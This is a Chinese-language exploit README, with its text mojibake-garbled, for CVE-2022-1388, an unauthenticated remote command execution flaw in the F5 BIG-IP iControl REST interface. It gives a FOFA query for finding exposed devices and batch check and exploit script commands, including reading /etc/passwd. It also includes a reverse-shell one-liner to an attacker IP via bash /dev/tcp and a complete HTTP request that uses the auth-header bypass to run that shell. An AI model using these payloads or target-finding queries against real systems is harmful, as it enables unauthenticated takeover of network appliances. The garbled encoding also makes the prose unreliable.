# 0x01 æ¼æ´æ¦‚è¿°
F5 BIG-IPæ˜¯ç¾å›½F5å…¬å¸çš„ä¸€æ¬¾é›†æˆäº†ç½‘ç»œæµé‡ç®¡ç†ã€åº”ç”¨ç¨‹åºå®‰å…¨ç®¡ç†ã€è´Ÿè½½å‡è¡¡ç­‰åŠŸèƒ½çš„åº”ç”¨äº¤ä»˜å¹³å°ã€‚`iControl REST` æ˜¯iControlæ¡†æ¶çš„æ¼”å˜ï¼Œä½¿ç”¨ REpresentational State Transfer (REST)ã€‚è¿™å…è®¸ç”¨æˆ·æˆ–è„šæœ¬ä¸ F5 è®¾å¤‡ä¹‹é—´è¿›è¡Œè½»é‡çº§ã€å¿«é€Ÿçš„äº¤äº’ã€‚

è¯¥æ¼æ´å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…é€šè¿‡ç®¡ç†ç«¯å£æˆ–è‡ªèº« IP åœ°å€å¯¹ BIG-IP ç³»ç»Ÿè¿›è¡Œç½‘ç»œè®¿é—®ï¼Œä»¥æ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤ã€åˆ›å»ºæˆ–åˆ é™¤æ–‡ä»¶ä»¥åŠç¦ç”¨BIG-IPä¸Šçš„æœåŠ¡ã€‚

# 0x02 å½±å“ç‰ˆæœ¬
è¯¥æ¼æ´å­˜åœ¨äº BIG-IP ä½¿ç”¨çš„ iControl REST æ¡†æ¶ä¸­ï¼ŒBIG-IPå­˜åœ¨æ¼æ´çš„ç‰ˆæœ¬å¦‚ä¸‹ï¼š
- 16.1.0 - 16.1.2
- 15.1.0 - 15.1.5
- 14.1.0 - 14.1.4
- 13.1.0 - 13.1.4
- 12.1.0 - 12.1.6
- 11.6.1 - 11.6.5

# 0x03 FOFA DORK
> title="BIG-IP&reg;-+Redirect" && "Server" && server=="Apache"

# 0X04 ç¯å¢ƒæ­å»º
https://www.i4k.xyz/article/weixin_37569048/100052755

# 0x05 æ¼æ´å¤ç°
ğŸ”— [CVE-2022-1388-EXP](https://github.com/bytecaps/CVE-2022-1388-EXP)

## 5.1ã€è®¿é—®F5 BIG-IPå¹³å°ç•Œé¢

![image](https://user-images.githubusercontent.com/84888757/167933484-d6a7c2de-fd98-4d13-87b6-c32166bfa645.png)

## 5.2ã€æ¼æ´éªŒè¯
æ ¹æ®POCï¼Œå…ˆè®¿é—®URLï¼šhttps://xx.xx.xx.xx/mgmt/shared/authn/loginï¼Œè‹¥å“åº”ä¸­å­˜åœ¨resterrorresponseï¼Œåˆ™ç¡®è®¤å­˜åœ¨æ¼æ´ã€‚

ğŸš© å°å‘ï¼šcheck.pyæ‰¹é‡éªŒè¯æœ‰æ¼æ´çš„urlï¼Œæœ‰çš„æ— æ³•æ‰§è¡Œå‘½ä»¤ï¼Œæ— æ³•è¿›è¡Œä¸‹ä¸€æ­¥åˆ©ç”¨ã€‚

```
å•ä¸ªæ£€æµ‹ï¼špython3 check.py -u url
æ‰¹é‡æ£€æµ‹ï¼špython3 check.py -f url.txt
```
![image](https://user-images.githubusercontent.com/84888757/167929154-d58ab8b5-4af7-4902-abc7-d76b8937fccc.png)

![image](https://user-images.githubusercontent.com/84888757/167934086-89ecd430-ef85-4d6a-b74b-74dadf035392.png)


## 5.3ã€å‘½ä»¤æ‰§è¡Œ
```
é»˜è®¤æ‰§è¡Œidå‘½ä»¤ï¼špython3 exp.py -a true -u https://xx.xx.xx.xx/
æ‰§è¡ŒæŒ‡å®šå‘½ä»¤ï¼špython3 exp.py -a true -u https://xx.xx.xx.xx/ -c "cat /etc/passwd"
```
![image](https://user-images.githubusercontent.com/84888757/167930074-206ef05c-6830-4122-9d6d-84c2a53a3335.png)

åå¼¹shellï¼ˆä½¿ç”¨exp.pyï¼‰
```
python3 exp.py -a true -u https://ç›®æ ‡ip/ -c "bash -i >& /dev/tcp/æ”»å‡»æœºip/port 0>&1"
```

åå¼¹shellï¼ˆä½¿ç”¨burpï¼‰
```
POST /mgmt/tm/util/bash HTTP/1.1
Host: xx.xx.xx.xx
Pragma: no-cache
Cache-Control: no-cache
sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Content-Type: application/json
Connection: keep-alive, x-F5-Auth-Token
X-F5-Auth-Token: a
Authorization: Basic YWRtaW46
Content-Length: 86

{"command": "run", "utilCmdArgs": "-c 'bash -i >& /dev/tcp/æ”»å‡»æœºip/1111 0>&1'"}
```

![image](https://user-images.githubusercontent.com/84888757/167932957-5889c145-ca81-4f19-b588-474e52bd762c.png)


# 0x06 å‚è€ƒé“¾æ¥
- https://mp.weixin.qq.com/s/VE0StMn_dZ8VyaxDw1nHag
- https://www.ddosi.org/cve-2022-1388/
